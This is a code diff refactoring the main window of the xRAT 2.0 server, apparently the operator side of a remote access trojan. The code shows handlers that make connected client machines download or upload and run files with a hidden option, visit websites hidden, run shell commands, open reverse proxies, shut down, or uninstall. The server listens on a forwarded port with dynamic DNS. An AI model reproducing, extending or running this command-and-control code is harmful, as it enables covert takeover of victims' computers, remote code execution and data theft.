@@ -4,27 +4,28 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
-using xServer.Core;
 using xServer.Core.Commands;
 using xServer.Core.Extensions;
 using xServer.Core.Helper;
 using xServer.Core.Misc;
 using xServer.Core.Networking;
-using xServer.Core.Packets;
 using xServer.Settings;
+using UserStatus = xServer.Core.Commands.CommandHandler.UserStatus;
+using ShutdownAction = xServer.Core.Commands.CommandHandler.ShutdownAction;
 
 namespace xServer.Forms
 {
     public partial class FrmMain : Form
     {
+        public ConnectionHandler ConServer { get; set; }
+        public static FrmMain Instance { get; private set; }
+
         private const int STATUS_ID = 4;
         private const int USERSTATUS_ID = 5;
 
-        public Server ListenServer;
         private readonly ListViewColumnSorter _lvwColumnSorter;
-        public static volatile FrmMain Instance;
-        private bool _titleUpdateRunning;
         private readonly object _lockClients = new object();
+        private bool _titleUpdateRunning;
 
         private void ReadSettings(bool writeIfNotExist = true)
         {
@@ -89,8 +90,8 @@ namespace xServer.Forms
                 {
                     int selected = lstClients.SelectedItems.Count;
                     this.Text = (selected > 0) ?
-                        string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", ListenServer.ConnectedAndAuthenticatedClients, selected) :
-                        string.Format("xRAT 2.0 - Connected: {0}", ListenServer.ConnectedAndAuthenticatedClients);
+                        string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", ConServer.ConnectedAndAuthenticatedClients, selected) :
+                        string.Format("xRAT 2.0 - Connected: {0}", ConServer.ConnectedAndAuthenticatedClients);
                 });
             }
             catch
@@ -101,60 +102,11 @@ namespace xServer.Forms
 
         private void InitializeServer()
         {
-            ListenServer = new Server();
+            ConServer = new ConnectionHandler();
 
-            ListenServer.AddTypesToSerializer(typeof (IPacket), new Type[]
-            {
-                typeof (Core.Packets.ServerPackets.InitializeCommand),
-                typeof (Core.Packets.ServerPackets.Disconnect),
-                typeof (Core.Packets.ServerPackets.Reconnect),
-                typeof (Core.Packets.ServerPackets.Uninstall),
-                typeof (Core.Packets.ServerPackets.DownloadAndExecute),
-                typeof (Core.Packets.ServerPackets.UploadAndExecute),
-                typeof (Core.Packets.ServerPackets.Desktop),
-                typeof (Core.Packets.ServerPackets.GetProcesses),
-                typeof (Core.Packets.ServerPackets.KillProcess),
-                typeof (Core.Packets.ServerPackets.StartProcess),
-                typeof (Core.Packets.ServerPackets.Drives),
-                typeof (Core.Packets.ServerPackets.Directory),
-                typeof (Core.Packets.ServerPackets.DownloadFile),
-                typeof (Core.Packets.ServerPackets.MouseClick),
-                typeof (Core.Packets.ServerPackets.GetSystemInfo),
-                typeof (Core.Packets.ServerPackets.VisitWebsite),
-                typeof (Core.Packets.ServerPackets.ShowMessageBox),
-                typeof (Core.Packets.ServerPackets.Update),
-                typeof (Core.Packets.ServerPackets.Monitors),
-                typeof (Core.Packets.ServerPackets.ShellCommand),
-                typeof (Core.Packets.ServerPackets.Rename),
-                typeof (Core.Packets.ServerPackets.Delete),
-                typeof (Core.Packets.ServerPackets.Action),
-                typeof (Core.Packets.ServerPackets.GetStartupItems),
-                typeof (Core.Packets.ServerPackets.AddStartupItem),
-                typeof (Core.Packets.ServerPackets.RemoveStartupItem),
-                typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
-                typeof (Core.Packets.ServerPackets.GetLogs),
-                typeof (Core.Packets.ClientPackets.Initialize),
-                typeof (Core.Packets.ClientPackets.Status),
-                typeof (Core.Packets.ClientPackets.UserStatus),
-                typeof (Core.Packets.ClientPackets.DesktopResponse),
-                typeof (Core.Packets.ClientPackets.GetProcessesResponse),
-                typeof (Core.Packets.ClientPackets.DrivesResponse),
-                typeof (Core.Packets.ClientPackets.DirectoryResponse),
-                typeof (Core.Packets.ClientPackets.DownloadFileResponse),
-                typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
-                typeof (Core.Packets.ClientPackets.MonitorsResponse),
-                typeof (Core.Packets.ClientPackets.ShellCommandResponse),
-                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
-                typeof (Core.Packets.ClientPackets.GetLogsResponse),
-                typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
-                typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
-                typeof (Core.ReverseProxy.Packets.ReverseProxyData),
-                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
-            });
-
-            ListenServer.ServerState += ServerState;
-            ListenServer.ClientState += ClientState;
-            ListenServer.ClientRead += ClientRead;
+            ConServer.ServerState += ServerState;
+            ConServer.ClientConnected += ClientConnected;
+            ConServer.ClientDisconnected += ClientDisconnected;
         }
 
         private void FrmMain_Load(object sender, EventArgs e)
@@ -165,7 +117,7 @@ namespace xServer.Forms
             {
                 if (XMLSettings.UseUPnP)
                     UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
-                ListenServer.Listen(XMLSettings.ListenPort);
+                ConServer.Listen(XMLSettings.ListenPort);
             }
 
             if (XMLSettings.IntegrateNoIP)
@@ -176,8 +128,7 @@ namespace xServer.Forms
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (ListenServer.Listening)
-                ListenServer.Disconnect();
+            ConServer.Disconnect();
 
             if (UPnP.IsPortForwarded)
                 UPnP.RemovePort();
@@ -192,13 +143,13 @@ namespace xServer.Forms
             UpdateWindowTitle();
         }
 
-        private void ServerState(Server server, bool listening)
+        private void ServerState(ushort port, bool listening)
         {
             try
             {
                 this.Invoke((MethodInvoker) delegate
                 {
-                    botListen.Text = listening ? string.Format("Listening on port {0}.", server.Port) : "Not listening.";
+                    botListen.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                 });
             }
             catch (InvalidOperationException)
@@ -206,39 +157,34 @@ namespace xServer.Forms
             }
         }
 
-        private void ClientState(Server server, Client client, bool connected)
+        private void ClientConnected(Client client)
         {
-            if (connected)
-            {
-                client.Value = new UserState();
-                // Initialize the UserState so we can store values in there if we need to.
-
-                new Core.Packets.ServerPackets.InitializeCommand().Execute(client);
-            }
-            else
-            {
-                if (client.Value != null)
-                {
-                    client.Value.DisposeForms();
-                    client.Value = null;
-                }
-
-                RemoveClientFromListview(client);
-            }
+            new Core.Packets.ServerPackets.GetAuthentication().Execute(client);
         }
 
-        private void ClientRead(Server server, Client client, IPacket packet)
+        private void ClientDisconnected(Client client)
         {
-            PacketHandler.HandlePacket(client, packet);
+            if (client.Value != null)
+            {
+                client.Value.DisposeForms();
+                client.Value = null;
+            }
+
+            RemoveClientFromListview(client);
         }
 
+        /// <summary>
+        /// Sets the tooltip text of the listview item of a client.
+        /// </summary>
+        /// <param name="c">The client on which the change is performed.</param>
+        /// <param name="text">The new tooltip text.</param>
         public void SetToolTipText(Client c, string text)
         {
             try
             {
                 lstClients.Invoke((MethodInvoker) delegate
                 {
-                    var item = GetListviewItemOfClient(c);
+                    var item = GetListViewItemByClient(c);
                     if (item != null)
                         item.ToolTipText = text;
                 });
@@ -248,6 +194,10 @@ namespace xServer.Forms
             }
         }
 
+        /// <summary>
+        /// Adds a connected client to the Listview.
+        /// </summary>
+        /// <param name="clientItem">The client to add.</param>
         public void AddClientToListview(ListViewItem clientItem)
         {
             try
@@ -259,7 +209,7 @@ namespace xServer.Forms
                     lock (_lockClients)
                     {
                         lstClients.Items.Add(clientItem);
-                        ListenServer.ConnectedAndAuthenticatedClients++;
+                        ConServer.ConnectedAndAuthenticatedClients++;
                     }
                 });
 
@@ -270,6 +220,10 @@ namespace xServer.Forms
             }
         }
 
+        /// <summary>
+        /// Removes a connected client from the Listview.
+        /// </summary>
+        /// <param name="c">The client to remove.</param>
         public void RemoveClientFromListview(Client c)
         {
             try
@@ -282,7 +236,7 @@ namespace xServer.Forms
                             .Where(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag)))
                         {
                             lvi.Remove();
-                            ListenServer.ConnectedAndAuthenticatedClients--;
+                            ConServer.ConnectedAndAuthenticatedClients--;
                             break;
                         }
                     }
@@ -294,13 +248,18 @@ namespace xServer.Forms
             }
         }
         
-        public void SetClientStatus(Client c, string text)
+        /// <summary>
+        /// Sets the status of a client.
+        /// </summary>
+        /// <param name="c">The client to update the status of.</param>
+        /// <param name="text">The new status.</param>
+        public void SetStatusByClient(Client c, string text)
         {
             try
             {
                 lstClients.Invoke((MethodInvoker) delegate
                 {
-                    var item = GetListviewItemOfClient(c);
+                    var item = GetListViewItemByClient(c);
                     if (item != null)
                         item.SubItems[STATUS_ID].Text = text;
                 });
@@ -310,15 +269,23 @@ namespace xServer.Forms
             }
         }
 
-        public void SetClientUserStatus(Client c, string text)
+        /// <summary>
+        /// Sets the user status of a client.
+        /// </summary>
+        /// <remarks>
+        /// Can be "Active" or "Idle".
+        /// </remarks>
+        /// <param name="c">The client to update the user status of.</param>
+        /// <param name="userStatus">The new user status.</param>
+        public void SetUserStatusByClient(Client c, UserStatus userStatus)
         {
             try
             {
                 lstClients.Invoke((MethodInvoker) delegate
                 {
-                    var item = GetListviewItemOfClient(c);
+                    var item = GetListViewItemByClient(c);
                     if (item != null)
-                        item.SubItems[USERSTATUS_ID].Text = text;
+                        item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
                 });
             }
             catch (InvalidOperationException)
@@ -326,19 +293,28 @@ namespace xServer.Forms
             }
         }
 
-        private ListViewItem GetListviewItemOfClient(Client c)
+        /// <summary>
+        /// Gets the Listview item which belongs to the client. 
+        /// </summary>
+        /// <param name="c">The client to get the Listview item of.</param>
+        /// <returns>Listview item of the client.</returns>
+        private ListViewItem GetListViewItemByClient(Client c)
         {
             ListViewItem itemClient = null;
 
             lstClients.Invoke((MethodInvoker) delegate
             {
                 itemClient = lstClients.Items.Cast<ListViewItem>()
-                    .FirstOrDefault(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag));
+                    .FirstOrDefault(lvi => lvi != null && lvi.Tag is Client && c.Equals((Client)lvi.Tag));
             });
 
             return itemClient;
         }
 
+        /// <summary>
+        /// Gets all selected clients.
+        /// </summary>
+        /// <returns>An array of selected Clients.</returns>
         private Client[] GetSelectedClients()
         {
             List<Client> clients = new List<Client>();
@@ -350,26 +326,7 @@ namespace xServer.Forms
                     if (lstClients.SelectedItems.Count == 0) return;
                     clients.AddRange(
                         lstClients.SelectedItems.Cast<ListViewItem>()
-                            .Where(lvi => lvi != null && (lvi.Tag as Client) != null)
-                            .Select(lvi => (Client) lvi.Tag));
-                }
-            });
-
-            return clients.ToArray();
-        }
-
-        private Client[] GetAllClients()
-        {
-            List<Client> clients = new List<Client>();
-
-            lstClients.Invoke((MethodInvoker)delegate
-            {
-                lock (_lockClients)
-                {
-                    if (lstClients.Items.Count == 0) return;
-                    clients.AddRange(
-                        lstClients.Items.Cast<ListViewItem>()
-                            .Where(lvi => lvi != null && (lvi.Tag as Client) != null)
+                            .Where(lvi => lvi != null && lvi.Tag is Client)
                             .Select(lvi => (Client)lvi.Tag));
                 }
             });
@@ -377,6 +334,10 @@ namespace xServer.Forms
             return clients.ToArray();
         }
 
+        /// <summary>
+        /// Displays a popup with information about a client.
+        /// </summary>
+        /// <param name="c">The client.</param>
         public void ShowPopup(Client c)
         {
             try
@@ -433,7 +394,7 @@ namespace xServer.Forms
                         {
                             foreach (Client c in GetSelectedClients())
                             {
-                                new Core.Packets.ServerPackets.Update(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
+                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                             }
                         }
                         else
@@ -456,10 +417,10 @@ namespace xServer.Forms
                                         break;
                                     }
 
-                                    int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)
+                                    int ID = new Random().Next(0, int.MaxValue);
 
-                                    CommandHandler.HandleStatus(c,
-                                        new Core.Packets.ClientPackets.Status("Uploading file..."));
+                                    CommandHandler.HandleSetStatus(c,
+                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
 
                                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                     {
@@ -471,7 +432,7 @@ namespace xServer.Forms
                                             error = true;
                                             break;
                                         }
-                                        new Core.Packets.ServerPackets.Update(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
+                                        new Core.Packets.ServerPackets.DoClientUpdate(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                     }
                                 }
                             }).Start();
@@ -485,7 +446,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Disconnect().Execute(c);
+                new Core.Packets.ServerPackets.DoClientDisconnect().Execute(c);
             }
         }
 
@@ -493,7 +454,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Reconnect().Execute(c);
+                new Core.Packets.ServerPackets.DoClientReconnect().Execute(c);
             }
         }
 
@@ -509,7 +470,7 @@ namespace xServer.Forms
             {
                 foreach (Client c in GetSelectedClients())
                 {
-                    new Core.Packets.ServerPackets.Uninstall().Execute(c);
+                    new Core.Packets.ServerPackets.DoClientUninstall().Execute(c);
                 }
             }
         }
@@ -612,7 +573,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Action(0).Execute(c);
+                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Shutdown).Execute(c);
             }
         }
 
@@ -620,7 +581,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Action(1).Execute(c);
+                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Restart).Execute(c);
             }
         }
 
@@ -628,7 +589,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Action(2).Execute(c);
+                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Standby).Execute(c);
             }
         }
 
@@ -698,10 +659,10 @@ namespace xServer.Forms
                                     break;
                                 }
 
-                                int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)
+                                int ID = new Random().Next(0, int.MaxValue);
 
-                                CommandHandler.HandleStatus(c,
-                                    new Core.Packets.ClientPackets.Status("Uploading file..."));
+                                CommandHandler.HandleSetStatus(c,
+                                    new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
 
                                 for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                 {
@@ -713,7 +674,7 @@ namespace xServer.Forms
                                         error = true;
                                         break;
                                     }
-                                    new Core.Packets.ServerPackets.UploadAndExecute(ID,
+                                    new Core.Packets.ServerPackets.DoUploadAndExecute(ID,
                                         Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                         currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                 }
@@ -734,7 +695,7 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL,
+                            new Core.Packets.ServerPackets.DoDownloadAndExecute(DownloadAndExecute.URL,
                                 DownloadAndExecute.RunHidden).Execute(c);
                         }
                     }
@@ -752,7 +713,7 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
+                            new Core.Packets.ServerPackets.DoVisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                         }
                     }
                 }
@@ -769,7 +730,7 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.ShowMessageBox(
+                            new Core.Packets.ServerPackets.DoShowMessageBox(
                                 MessageBoxData.Caption, MessageBoxData.Text, MessageBoxData.Button, MessageBoxData.Icon).Execute(c);
                         }
                     }
@@ -790,7 +751,7 @@ namespace xServer.Forms
 
         private void menuSettings_Click(object sender, EventArgs e)
         {
-            using (var frm = new FrmSettings(ListenServer))
+            using (var frm = new FrmSettings(ConServer))
             {
                 frm.ShowDialog();
             }
@@ -806,14 +767,14 @@ namespace xServer.Forms
 
         private void menuStatistics_Click(object sender, EventArgs e)
         {
-            if (ListenServer.BytesReceived == 0 || ListenServer.BytesSent == 0)
+            if (ConServer.BytesReceived == 0 || ConServer.BytesSent == 0)
                 MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK,
                     MessageBoxIcon.Information);
             else
             {
                 using (
-                    var frm = new FrmStatistics(ListenServer.BytesReceived, ListenServer.BytesSent,
-                        ListenServer.ConnectedAndAuthenticatedClients, ListenServer.AllTimeConnectedClients.Count))
+                    var frm = new FrmStatistics(ConServer.BytesReceived, ConServer.BytesSent,
+                        ConServer.ConnectedAndAuthenticatedClients, ConServer.AllTimeConnectedClientsCount))
                 {
                     frm.ShowDialog();
                 }
